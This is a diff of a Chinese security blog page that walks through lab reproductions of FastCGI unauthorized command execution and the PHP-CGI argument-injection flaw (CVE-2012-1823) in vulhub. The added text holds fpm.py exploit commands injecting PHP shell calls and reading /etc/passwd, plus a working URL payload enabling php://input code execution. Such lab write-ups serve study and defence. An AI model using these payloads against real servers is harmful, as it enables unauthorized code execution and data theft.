@@ -79,19 +79,19 @@
 
 
 
-<meta name="description" content="其它中间件相关漏洞FastCGI未授权访问、任意命令执行1、 漏洞简介及成因 服务端使用fastcgi协议并对外网开放9000端口，可以构造fastcgi协议包内容，实现未授权访问服务端.php文件以及执行任意命令。 2、 漏洞复现 使用vulhub实验环境，启动实验环境。 在攻击机使用命令python fpm.py 192.168.237.136 &#x2F;etc&#x2F;passwd，观察返回结果。  由于访">
+<meta name="description" content="其它中间件相关漏洞FastCGI未授权访问、任意命令执行1、 漏洞简介及成因 服务端使用fastcgi协议并对外网开放9000端口，可以构造fastcgi协议包内容，实现未授权访问服务端.php文件以及执行任意命令。 参考P牛文章：https:&#x2F;&#x2F;www.leavesongs.com&#x2F;PENETRATION&#x2F;fastcgi-and-php-fpm.html 2、 漏洞复现 使用vulhub实验环境">
 <meta property="og:type" content="article">
 <meta property="og:title" content="其他中间件漏洞">
 <meta property="og:url" content="https://shu1l.github.io/2020/04/03/qi-ta-zhong-jian-jian-lou-dong/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="其它中间件相关漏洞FastCGI未授权访问、任意命令执行1、 漏洞简介及成因 服务端使用fastcgi协议并对外网开放9000端口，可以构造fastcgi协议包内容，实现未授权访问服务端.php文件以及执行任意命令。 2、 漏洞复现 使用vulhub实验环境，启动实验环境。 在攻击机使用命令python fpm.py 192.168.237.136 &#x2F;etc&#x2F;passwd，观察返回结果。  由于访">
+<meta property="og:description" content="其它中间件相关漏洞FastCGI未授权访问、任意命令执行1、 漏洞简介及成因 服务端使用fastcgi协议并对外网开放9000端口，可以构造fastcgi协议包内容，实现未授权访问服务端.php文件以及执行任意命令。 参考P牛文章：https:&#x2F;&#x2F;www.leavesongs.com&#x2F;PENETRATION&#x2F;fastcgi-and-php-fpm.html 2、 漏洞复现 使用vulhub实验环境">
 <meta property="og:image" content="https://image.3001.net/images/20181216/1544955569_5c1626b181057.png!small">
 <meta property="og:image" content="https://image.3001.net/images/20181216/1544955581_5c1626bd94566.png!small">
 <meta property="og:image" content="https://image.3001.net/images/20181216/1544955594_5c1626ca98c2c.png!small">
 <meta property="og:image" content="https://image.3001.net/images/20181216/1544955605_5c1626d552e60.png!small">
 <meta property="og:image" content="https://image.3001.net/images/20181216/1544955613_5c1626dd7ad9f.png!small">
 <meta property="article:published_time" content="2020-04-03T02:49:25.000Z">
-<meta property="article:modified_time" content="2020-04-19T11:16:55.000Z">
+<meta property="article:modified_time" content="2020-04-21T02:53:46.188Z">
 <meta property="article:author" content="Shu1L">
 <meta property="article:tag" content="FastCGI">
 <meta name="twitter:card" content="summary">
@@ -359,21 +359,35 @@
       
         <h2 id="其它中间件相关漏洞"><a href="#其它中间件相关漏洞" class="headerlink" title="其它中间件相关漏洞"></a>其它中间件相关漏洞</h2><h4 id="FastCGI未授权访问、任意命令执行"><a href="#FastCGI未授权访问、任意命令执行" class="headerlink" title="FastCGI未授权访问、任意命令执行"></a>FastCGI未授权访问、任意命令执行</h4><p><strong>1、 漏洞简介及成因</strong></p>
 <p>服务端使用fastcgi协议并对外网开放9000端口，可以构造fastcgi协议包内容，实现未授权访问服务端.php文件以及执行任意命令。</p>
+<p>参考P牛文章：<a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p>
 <p><strong>2、 漏洞复现</strong></p>
 <p>使用vulhub实验环境，启动实验环境。</p>
+<pre><code>cd /vulhub/fpm
+docker-compose build &amp;&amp; docker-compose up -d</code></pre><p><strong>EXP</strong>:<a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75" target="_blank" rel="noopener">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a></p>
 <p>在攻击机使用命令python fpm.py 192.168.237.136 /etc/passwd，观察返回结果。</p>
 <p><a href="https://image.3001.net/images/20181216/1544955569_5c1626b181057.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955569_5c1626b181057.png!small" alt="img"></a></p>
 <p>由于访问非*.PHP文件，所以返回结果403。</p>
 <p>使用命令执行一个默认存在的 php 文件。</p>
 <pre><code>python fpm.py 192.168.237.136 /usr/local/lib/php/PEAR.php</code></pre><p><a href="https://image.3001.net/images/20181216/1544955581_5c1626bd94566.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955581_5c1626bd94566.png!small" alt="img"></a></p>
 <p>利用命令进行任意命令执行复现。</p>
-<pre><code>python fpm.py 192.168.139.129 /usr/local/lib/php/PEAR.php-c &#39;&lt;?php echo `pwd`; ?&gt;&#39;python fpm.py 192.168.139.129 /usr/local/lib/php/PEAR.php-c &#39;&lt;?php echo `ifconfig`; ?&gt;&#39;python fpm.py 192.168.139.129 /usr/local/lib/php/PEAR.php-c &#39;&lt;?php echo `ls`; ?&gt;&#39;</code></pre><p><a href="https://image.3001.net/images/20181216/1544955594_5c1626ca98c2c.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955594_5c1626ca98c2c.png!small" alt="img"></a></p>
+<pre><code>python fpm.py 192.168.139.129 /usr/local/lib/php/PEAR.php-c &#39;&lt;?php echo `pwd`; ?&gt;&#39;
+python fpm.py 192.168.139.129 /usr/local/lib/php/PEAR.php-c &#39;&lt;?php echo `ifconfig`; ?&gt;&#39;
+python fpm.py 192.168.139.129 /usr/local/lib/php/PEAR.php-c &#39;&lt;?php echo `ls`; ?&gt;&#39;</code></pre><p><a href="https://image.3001.net/images/20181216/1544955594_5c1626ca98c2c.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955594_5c1626ca98c2c.png!small" alt="img"></a></p>
 <p><strong>3、 漏洞修复</strong></p>
 <p>更改默认端口</p>
 <h3 id="（二）-PHPCGI远程代码执行"><a href="#（二）-PHPCGI远程代码执行" class="headerlink" title="（二） PHPCGI远程代码执行"></a>（二） PHPCGI远程代码执行</h3><p><strong>1、 漏洞简介及成因</strong></p>
 <p>在apache调用php解释器解释.php文件时，会将url参数传我给php解释器，如果在url后加传命令行开关（例如-s、-d 、-c或-dauto_prepend_file%3d/etc/passwd+-n）等参数时，会导致源代码泄露和任意代码执行。</p>
 <p>此漏洞影响php-5.3.12以前的版本，mod方式、fpm方式不受影响。</p>
+<p><a href="http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/" target="_blank" rel="noopener">http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/</a><br>p牛讲的很详细：<a href="https://vulhub.org/#/environments/php/CVE-2012-1823/" target="_blank" rel="noopener">https://vulhub.org/#/environments/php/CVE-2012-1823/</a></p>
 <p><strong>2、 漏洞复现</strong></p>
+<p>cgi模式下有如下一些参数可用：</p>
+<pre><code>-c 指定php.ini文件的位置
+-n 不要加载php.ini文件
+-d 指定配置项
+-b 启动fastcgi进程
+-s 显示文件源码
+-T 执行指定次该文件
+-h和-? 显示帮助</code></pre><p>通过使用<code>-d</code>指定<code>auto_prepend_file</code>来制造任意文件包含漏洞，执行任意代码：<br><code>auto_prepend_file</code>与<code>auto_append_file</code>:将文件require到所有页面的顶部与底部。<br>空格用<code>+</code>或<code>%20</code>代替，<code>=</code>用url编码代替。<br>payload：<code>-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input</code></p>
 <p>使用vulhub实验环境，启动环境。</p>
 <p>访问<a href="http://192.168.139.129:8080/index.php。" target="_blank" rel="noopener">http://192.168.139.129:8080/index.php。</a></p>
 <p><a href="https://image.3001.net/images/20181216/1544955605_5c1626d552e60.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955605_5c1626d552e60.png!small" alt="img"></a></p>
@@ -511,7 +525,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">38</span>
+                  <span class="site-state-item-count">39</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -533,7 +547,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">21</span>
+                  <span class="site-state-item-count">24</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
